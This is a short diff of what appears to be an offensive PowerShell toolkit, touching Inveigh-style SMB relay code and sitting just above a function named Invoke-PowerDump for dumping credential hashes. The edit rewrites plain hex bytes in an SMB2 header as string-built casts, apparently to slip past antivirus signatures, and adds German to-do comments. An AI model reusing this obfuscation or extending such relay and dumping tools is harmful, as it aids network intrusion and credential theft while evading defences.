@@ -2892,7 +2892,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                         {
                             $stage_current = $stage
                             $message_ID++
-                            $packet_SMB2_header = New-PacketSMB2Header 0x04,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
+                            $packet_SMB2_header = New-PacketSMB2Header (([Byte]('0x'+'04')),([Byte]('0x'+'00'))) (([Byte]('0x'+'01')),([Byte]('0x'+'00'))) $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                         
                             if($SMB_signing)
                             {
@@ -2948,6 +2948,13 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
 }
 
 }
+
+
+
+
+# PrivCheck überarbeiten
+# Service Konten? 
+# C# Code rauswerfen 
 
 function global:Invoke-PowerDump
 {
